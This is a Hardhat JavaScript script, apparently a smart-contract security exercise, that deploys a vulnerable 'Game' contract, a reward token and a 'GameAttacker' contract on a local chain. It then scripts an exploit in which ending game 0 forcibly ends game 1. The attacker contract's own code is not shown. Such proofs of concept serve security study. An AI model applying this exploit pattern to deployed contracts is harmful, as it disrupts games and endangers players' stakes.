require("@nomiclabs/hardhat-ethers");
const { ethers } = require("hardhat");

async function preMine(blockNumber) {
    await ethers.provider.send("evm_setAutomine", [false]);
    await ethers.provider.send("evm_setIntervalMining", [0]);

    blockNumber = "0x" + blockNumber.toString(16)
    await ethers.provider.send("hardhat_mine", [blockNumber]);
    await ethers.provider.send("evm_setIntervalMining", [100]);
    // re-enable auto-mining when you are done, so you dont need to manually mine future blocks
    await ethers.provider.send("evm_setAutomine", [true]);
}

async function hack() {
    await preMine(300);

    [owner, user1, user2, user3, user4, user5] = await ethers.getSigners();

    // 1. Deploy Game
    let gameFactory = await ethers.getContractFactory("Game")
    let game = await gameFactory.connect(owner).deploy(10)
    await game.deployed()
    console.log("Game address: ", game.address)

    // 2. Deploy attacker contract
    let attackerFactory = await ethers.getContractFactory("GameAttacker")
    let attacker = await attackerFactory.connect(user5).deploy(game.address)
    await attacker.deployed()
    console.log("Attacker address: ", attacker.address)

    // 3. Start game and deploy reward token
    let ercRewardFactory = await ethers.getContractFactory("MyERC20")
    let ercReward = await ercRewardFactory.connect(owner).deploy(1000)
    await ercReward.deployed()
    let transferTx = await ercReward.connect(owner).transfer(game.address, 500)
    await transferTx.wait()
    console.log("Erc20 address: ", ercReward.address)

    let gameStake = 10
    let gameReward = 50
    let startGameTx = await game.connect(owner).startGame(gameStake, gameReward, ercReward.address)
    await startGameTx.wait()
    console.log("Started game 0")

    // 4. Join game with 2 normal players
    let ow = {value: gameStake}
    let joinTx = await game.connect(user1).joinGame(0, ow)
    await joinTx.wait()
    console.log("User 1 joined game 0")

    joinTx = await game.connect(user2).joinGame(0, ow)
    await joinTx.wait()
    console.log("User 2 joined game 0")

    // 5. Join game with the attacker contract
    joinTx = await attacker.connect(user5).joinGame(0, ow)
    await joinTx.wait()
    console.log("Attacker sc joined game 0")

    // 6. Call round()
    let roundTx = await game.connect(owner).round(0)
    await roundTx.wait()
    console.log("Called round on game 0")

    // 7. Start another game
    gameStake = 5
    gameReward = 25
    ow = {value: gameStake}
    startGameTx = await game.connect(owner).startGame(gameStake, gameReward, ercReward.address)
    await startGameTx.wait()
    console.log("Started game 1")

    // 8. Join with 3 normal players
    joinTx = await game.connect(user1).joinGame(1, ow)
    await joinTx.wait()
    console.log("User 1 joined game 1")

    joinTx = await game.connect(user2).joinGame(1, ow)
    await joinTx.wait()
    console.log("User 2 joined game 1")

    joinTx = await game.connect(user3).joinGame(1, ow)
    await joinTx.wait()
    console.log("User 3 joined game 1")

    console.log("Game 0 ended value before calling end: ", await game.gameEnded(0))
    console.log("Game 1 ended value before hack: ", await game.gameEnded(1))

    // 9. Call end game which should call round for game number 2
    let endGameTx = await game.connect(owner).endGame(0);
    await endGameTx.wait()

    console.log("Game 0 ended value after calling end: ", await game.gameEnded(0))
    console.log("Game 1 ended value after hack: ", await game.gameEnded(1))
}

hack()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });